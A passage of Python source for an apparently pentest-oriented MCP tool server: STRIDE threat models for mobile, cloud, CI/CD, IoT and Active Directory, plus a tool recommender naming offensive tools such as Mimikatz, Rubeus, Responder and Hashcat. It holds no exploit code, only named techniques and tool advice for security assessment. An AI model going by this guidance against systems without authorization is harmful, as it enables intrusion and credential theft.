                        "Fake app distribution",
                    ],
                    "mitigations": [
                        "Certificate pinning with backup keys",
                        "Server-side biometric validation",
                        "App Links / Universal Links verification",
                        "App store only distribution",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Runtime hooking (Frida)",
                        "Binary patching",
                        "Root/jailbreak exploitation",
                        "Shared preference modification",
                    ],
                    "mitigations": [
                        "Root/jailbreak detection",
                        "Integrity checks",
                        "Obfuscation (ProGuard/R8)",
                        "Encrypted local storage",
                    ],
                },
                "repudiation": {
                    "threats": ["Client-side only logging", "Offline action replay", "Transaction manipulation"],
                    "mitigations": [
                        "Server-side logging for all critical actions",
                        "Server-side validation of all operations",
                        "Transaction signing",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Plaintext local storage",
                        "Screenshots of sensitive data",
                        "Clipboard data leakage",
                        "Backup extraction",
                        "Hardcoded API keys in binary",
                    ],
                    "mitigations": [
                        "Encrypted storage (Keychain/Keystore)",
                        "Prevent screenshots on sensitive screens",
                        "Clear clipboard on background",
                        "Exclude from backups",
                        "Runtime key retrieval",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Local DoS via malformed input",
                        "Push notification flooding",
                        "Deep link crash vectors",
                    ],
                    "mitigations": [
                        "Input validation",
                        "Rate limit push notifications",
                        "Deep link input sanitization",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "Intent hijacking (Android)",
                        "URL scheme hijacking (iOS)",
                        "Privilege escalation via IPC",
                        "WebView JavaScript bridge abuse",
                    ],
                    "mitigations": [
                        "Explicit intents",
                        "Universal Links",
                        "IPC permission enforcement",
                        "Disable JavaScript in WebViews unless required",
                    ],
                },
            },
            "rick_note": "The binary is in the attacker's hands. Assume it will be reverse engineered. Never trust the client. All security decisions happen server-side. Frida + Objection will bypass almost anything client-side.",
        },
        "cloud_infra": {
            "system": "Cloud Infrastructure (AWS/Azure/GCP)",
            "trust_boundaries": [
                "Internet ↔ Cloud Perimeter",
                "Public Subnet ↔ Private Subnet",
                "Account/Subscription ↔ Account/Subscription",
                "Cloud ↔ On-Premises",
                "Control Plane ↔ Data Plane",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Stolen cloud credentials",
                        "Assumed role abuse",
                        "Metadata service credential theft (IMDS)",
                        "Service principal impersonation",
                    ],
                    "mitigations": [
                        "MFA on all accounts",
                        "Least privilege IAM",
                        "IMDSv2 required",
                        "Managed identities over keys",
                    ],
                },
                "tampering": {
                    "threats": [
                        "S3/Blob policy modification",
                        "Security group rule changes",
                        "IAM policy escalation",
                        "Infrastructure as Code injection",
                    ],
                    "mitigations": [
                        "SCPs/Azure Policy guardrails",
                        "CloudTrail/Activity Log monitoring",
                        "IAM Access Analyzer",
                        "IaC pipeline with approval gates",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "CloudTrail disabled/deleted",
                        "Log gaps in multi-region",
                        "Cross-account activity not tracked",
                    ],
                    "mitigations": [
                        "CloudTrail in all regions with log validation",
                        "Organization trail",
                        "Centralized logging to security account",
                        "Immutable log storage",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Public S3 buckets/blobs",
                        "Exposed snapshots/AMIs",
                        "Secrets in user-data/metadata",
                        "Overpermissioned IAM read access",
                    ],
                    "mitigations": [
                        "Block public access at account level",
                        "Private snapshots only",
                        "Secrets Manager for all secrets",
                        "IAM Access Analyzer",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Resource exhaustion (crypto mining)",
                        "DDoS on public endpoints",
                        "Runaway Lambda/Functions",
                        "Storage/compute quota exhaustion",
                    ],
                    "mitigations": [
                        "Billing alerts",
                        "DDoS protection (Shield/Front Door)",
                        "Concurrency limits",
                        "Quota monitoring and alerts",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "IAM privilege escalation paths",
                        "Cross-account role assumption",
                        "Service-linked role abuse",
                        "Resource policy wildcards",
                    ],
                    "mitigations": [
                        "Least privilege with regular review",
                        "Condition keys on AssumeRole",
                        "Audit service-linked roles",
                        "No wildcard resource policies",
                    ],
                },
            },
            "rick_note": "IAM IS the perimeter in cloud. Model every identity (user, role, service principal, managed identity) and what it can access. Resource policies + identity policies = the two sides of every access decision. Miss one and you've got a gap.",
        },
        "ci_cd_pipeline": {
            "system": "CI/CD Pipeline",
            "trust_boundaries": [
                "Developer ↔ VCS",
                "VCS ↔ CI Runner",
                "CI Runner ↔ Artifact Registry",
                "CI Runner ↔ Production",
                "CI Runner ↔ Secrets Manager",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Compromised developer account pushing malicious code",
                        "Stolen CI/CD tokens",
                        "Rogue CI runner registration",
                        "Git commit author spoofing",
                    ],
                    "mitigations": [
                        "MFA + SSO for VCS access",
                        "Short-lived CI tokens",
                        "Runner registration with approval",
                        "Signed commits required",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Pipeline definition injection",
                        "Dependency poisoning",
                        "Build artifact tampering",
                        "Environment variable manipulation",
                    ],
                    "mitigations": [
                        "Pipeline-as-code with PR review",
                        "Dependency pinning + lock files",
                        "Artifact signing (Sigstore/cosign)",
                        "Secrets as pipeline variables, not env",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "Pipeline execution without audit trail",
                        "Manual deployments bypassing pipeline",
                        "Unsigned artifacts deployed",
                    ],
                    "mitigations": [
                        "Immutable pipeline logs",
                        "Enforce pipeline-only deployments",
                        "Artifact provenance (SLSA)",
                        "Deployment approval gates",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Secrets in pipeline logs",
                        "Secrets in build artifacts",
                        "CI runner access to production secrets",
                        "Source code in build cache",
                    ],
                    "mitigations": [
                        "Secret masking in logs",
                        "Multi-stage builds (don't copy secrets)",
                        "Scoped secrets per environment",
                        "Cache isolation",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Pipeline resource exhaustion",
                        "Fork bomb in CI",
                        "Infinite loop in build",
                        "Runner pool starvation",
                    ],
                    "mitigations": [
                        "Pipeline timeout limits",
                        "Resource quotas per build",
                        "Concurrency limits",
                        "Dedicated runner pools",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "CI runner with production access",
                        "Self-hosted runner escape",
                        "Pipeline secret scope creep",
                        "Workflow approval bypass",
                    ],
                    "mitigations": [
                        "Least privilege runners per environment",
                        "Ephemeral runners (destroy after use)",
                        "Secrets scoped to specific pipelines",
                        "Required reviewers for production",
                    ],
                },
            },
            "rick_note": "The pipeline IS domain admin for your infrastructure. Compromise the build, own everything downstream. Treat CI/CD with the same paranoia you treat production access. Ephemeral runners, signed artifacts, scoped secrets — the holy trinity of pipeline security.",
        },
        "iot": {
            "system": "IoT / Embedded Systems",
            "trust_boundaries": [
                "Device ↔ Cloud",
                "Device ↔ Gateway",
                "Device ↔ Mobile App",
                "Firmware ↔ Hardware",
                "Device ↔ Local Network",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Device identity cloning",
                        "Rogue device registration",
                        "MQTT broker impersonation",
                        "OTA update server spoofing",
                    ],
                    "mitigations": [
                        "Unique device certificates (X.509)",
                        "Mutual TLS",
                        "Broker certificate validation",
                        "Signed firmware updates",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Firmware modification",
                        "JTAG/UART debug access",
                        "Sensor data manipulation",
                        "Flash chip extraction and modification",
                    ],
                    "mitigations": [
                        "Secure boot chain",
                        "Disable debug interfaces in production",
                        "Data integrity checks (HMAC)",
                        "Encrypted flash storage",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "No logging on device",
                        "Offline operation without audit trail",
                        "Timestamp manipulation",
                    ],
                    "mitigations": [
                        "Cloud-side logging of all device actions",
                        "Signed telemetry data",
                        "Secure time source (NTP with auth)",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Hardcoded credentials in firmware",
                        "Plaintext communication",
                        "Physical memory extraction",
                        "Default credentials",
                    ],
                    "mitigations": [
                        "Secure element for key storage",
                        "TLS for all communication",
                        "Tamper-resistant enclosure",
                        "Unique per-device credentials",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Battery drain attacks",
                        "RF jamming",
                        "MQTT message flooding",
                        "Firmware bricking via bad OTA",
                    ],
                    "mitigations": [
                        "Power-efficient protocols",
                        "Frequency hopping",
                        "Message rate limiting",
                        "Rollback-capable firmware updates",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "Privilege escalation via command injection",
                        "Buffer overflow in firmware",
                        "Cloud API lateral movement from device creds",
                        "Gateway compromise for fleet access",
                    ],
                    "mitigations": [
                        "Input validation on all commands",
                        "Memory-safe languages/practices",
                        "Device-scoped cloud permissions",
                        "Gateway isolation and monitoring",
                    ],
                },
            },
            "rick_note": "Physical access = game over for most IoT. Assume the device will be in hostile hands. Secure boot, encrypted storage, unique credentials per device. And never, EVER hardcode credentials in firmware — they will be extracted.",
        },
        "active_directory": {
            "system": "Active Directory Infrastructure",
            "trust_boundaries": [
                "Workstation ↔ DC",
                "DC ↔ DC (Replication)",
                "Forest ↔ Forest (Trust)",
                "On-Prem ↔ Cloud (Hybrid)",
                "Admin Tier ↔ Admin Tier",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "NTLM relay attacks",
                        "Kerberos ticket forgery (Golden/Silver)",
                        "LLMNR/NBT-NS poisoning",
                        "Machine account impersonation",
                        "PRT theft in hybrid environments",
                    ],
                    "mitigations": [
                        "SMB signing enforced",
                        "Protected Users group",
                        "Disable LLMNR/NBT-NS/WPAD",
                        "Credential Guard",
                        "Conditional Access policies",
                    ],
                },
                "tampering": {
                    "threats": [
                        "GPO modification for persistence",
                        "AdminSDHolder abuse",
                        "DCShadow attacks",
                        "ADCS template modification",
                        "DNS record poisoning",
                    ],
                    "mitigations": [
                        "GPO change monitoring",
                        "AdminSDHolder monitoring",
                        "DC replication monitoring",
                        "ADCS template auditing",
                        "DNS audit logging",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "Audit log tampering on DCs",
                        "Event log clearing",
                        "Timestomping on AD objects",
                        "Disabled audit policies",
                    ],
                    "mitigations": [
                        "Forward logs to SIEM immediately",
                        "Monitor event log clearing (1102)",
                        "Enable all critical audit policies (4768, 4769, 4776)",
                        "Immutable log storage",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "LDAP anonymous binding",
                        "Password in description fields",
                        "GPP passwords (cpassword)",
                        "LSASS credential dumping",
                        "DCSync by compromised account",
                    ],
                    "mitigations": [
                        "Disable anonymous LDAP",
                        "Audit description fields",
                        "Remove all GPP passwords",
                        "Credential Guard + LSA protection",
                        "Limit DCSync rights to DCs only",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Account lockout attacks",
                        "Replication flooding",
                        "DNS poisoning causing auth failures",
                        "Certificate authority takedown",
                    ],
                    "mitigations": [
                        "Smart lockout policies",
                        "Replication monitoring",
                        "DNS redundancy and DNSSEC",
                        "CA backup and recovery procedures",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "Kerberoasting",
                        "AS-REP Roasting",
                        "ADCS ESC1-ESC8",
                        "Unconstrained delegation abuse",
                        "ACL-based attacks (WriteDACL, GenericAll)",
                    ],
                    "mitigations": [
                        "gMSA for service accounts",
                        "Require Kerberos preauth",
                        "Audit and fix ADCS templates",
                        "Constrained delegation only",
                        "Regular ACL audit with BloodHound",
                    ],
                },
            },
            "rick_note": "AD threat modeling starts with BloodHound. Map every path to DA, every Kerberoastable account, every ADCS template. STRIDE on AD is really about tier violations — when Tier 2 can reach Tier 0, you've got a spoofing AND elevation problem. Fix the tiers, fix 80% of the threats.",
        },
    }
    t = params.target.lower().strip()
    model = models.get(t)
    if not model:
        return f"Error: Unknown target '{t}'. Available: {', '.join(models.keys())}"
    if params.context:
        model["context"] = _sanitize(params.context)
    model["methodology"] = "STRIDE (Microsoft Threat Modeling)"
    model["authorization"] = "Use for defensive security architecture and authorized assessments only."
    return _fmt(model, params.response_format, title=f"{CALLSIGN} Threat Model")


async def rick_tool_recommend(params: ToolRecInput) -> str:
    """Scenario-aware security tool recommendations. Analyzes keywords and returns curated selections."""
    s = params.scenario.lower()
    r: dict = {
        "primary": [],
        "secondary": [],
        "automation": ["Custom Python scripts", "GitHub Actions", "PlexTrac"],
        "rick_note": [],
    }
    if any(k in s for k in ["web", "http", "api", "application", "xss", "sqli", "injection"]):
        r["primary"] += ["Burp Suite Professional", "ffuf", "Nuclei"]
        r["secondary"] += ["SQLMap", "Arjun", "dalfox", "Postman"]
        r["rick_note"].append("Burp Suite is non-negotiable for web testing. Home base.")
    if any(k in s for k in ["network", "infrastructure", "internal", "port", "smb"]):
        r["primary"] += ["Nmap", "CrackMapExec", "Responder"]
        r["secondary"] += ["masscan", "Wireshark", "Impacket", "Chisel/Ligolo-ng"]
        r["rick_note"].append("Full port scans. Critical vulns hide on high ports. Map the terrain.")
    if any(k in s for k in ["active directory", "ad ", "domain", "kerberos", "ldap"]):
        r["primary"] += ["BloodHound + SharpHound", "Impacket", "CrackMapExec"]
        r["secondary"] += ["Rubeus", "Certify/Certipy", "PowerView", "Mimikatz", "Hashcat"]
        r["rick_note"].append("BloodHound first. Then Kerberoast, AS-REP Roast, check ADCS.")
    if any(k in s for k in ["cloud", "azure", "aws", "gcp", "kubernetes", "k8s", "container"]):
        r["primary"] += ["ScoutSuite", "Prowler", "kubectl + kube-hunter"]
        r["secondary"] += ["Pacu", "ROADtools", "trivy/grype", "Terraform"]
        r["rick_note"].append("Check IAM, storage permissions, metadata services.")
    if any(k in s for k in ["password", "credential", "crack", "hash", "brute"]):
        r["primary"] += ["Hashcat", "John the Ripper", "Hydra"]
        r["secondary"] += ["CeWL", "SecLists", "hashid"]
        r["rick_note"].append("OneRuleToRuleThemAll + rockyou with Hashcat.")
    if any(k in s for k in ["osint", "recon", "intelligence", "phishing"]):
        r["primary"] += ["Amass + Subfinder", "theHarvester", "Maltego"]
        r["secondary"] += ["Shodan/Censys", "crt.sh", "SpiderFoot", "GoPhish"]
        r["rick_note"].append("OSINT before everything. Know the terrain first. Frontier scouting.")
    if not r["primary"]:
        r["primary"] = ["Burp Suite", "Nmap", "Nuclei"]
        r["secondary"] = ["Metasploit", "CrackMapExec", "ffuf"]
        r["rick_note"].append("Burp + Nmap + Nuclei covers massive attack surface.")
    r["scenario"] = params.scenario
    return _fmt(r, params.response_format, title=f"{CALLSIGN} Tool Recommendations")


def register(mcp):
    """Register tools on the MCP server."""
    mcp.tool(
        name="rick_tool_recommend",
        annotations={
            "title": "Tool Recommendation Engine",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_tool_recommend))
    mcp.tool(
        name="rick_recon",
        annotations={
            "title": "Recon Playbooks",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_recon))
    mcp.tool(
        name="rick_vuln_assess",
        annotations={
            "title": "Vuln Assessment Framework",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_vuln_assess))
    mcp.tool(
        name="rick_attack_chain",
        annotations={
            "title": "ATT&CK Kill Chain Mapper",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_attack_chain))
    mcp.tool(
        name="rick_pivot_plan",
        annotations={
            "title": "Pivot & Lateral Movement Planner",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_pivot_plan))
    mcp.tool(
        name="rick_cheatsheet",
        annotations={
            "title": "Field Manual Cheatsheets",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_cheatsheet))
    mcp.tool(
        name="rick_threat_model",
        annotations={
            "title": "STRIDE Threat Model",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_threat_model))
